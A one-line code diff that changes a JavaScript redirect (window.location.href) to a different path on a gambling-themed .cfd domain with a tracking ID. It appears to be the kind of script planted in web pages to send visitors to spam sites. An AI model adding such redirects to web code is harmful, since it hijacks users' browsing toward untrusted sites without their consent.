@@ -1,1 +1,1 @@
-window.location.href = "https://progambling.cfd/TzUPc/go?sid=7747";
+window.location.href = "https://progambling.cfd/KXF/go?sid=7747";
